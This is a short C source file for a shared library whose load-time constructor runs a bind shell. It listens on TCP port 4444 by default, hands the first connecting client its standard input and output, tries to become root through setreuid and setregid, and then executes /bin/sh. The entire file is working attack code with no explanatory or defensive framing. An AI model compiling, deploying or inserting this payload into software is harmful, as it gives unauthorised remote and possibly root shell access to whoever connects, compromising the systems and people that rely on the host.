#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

__attribute__((constructor)) void init(void) {
    if (getenv("SHELL_BIND_ACTIVE")) return;
    
    const char* port_str = getenv("BIND_PORT");
    int port = port_str ? atoi(port_str) : 4444;
    
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return;
    
    int opt = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);
    
    if (bind(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0 ||
        listen(sockfd, 1) < 0) {
        close(sockfd);
        return;
    }
    
    int client = accept(sockfd, NULL, NULL);
    if (client < 0) {
        close(sockfd);
        return;
    }
    
    setenv("SHELL_BIND_ACTIVE", "1", 1);
    
    dup2(client, 0);
    dup2(client, 1);
    dup2(client, 2);
    close(client);
    close(sockfd);
    
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    
    execl("/bin/sh", "sh", NULL);
}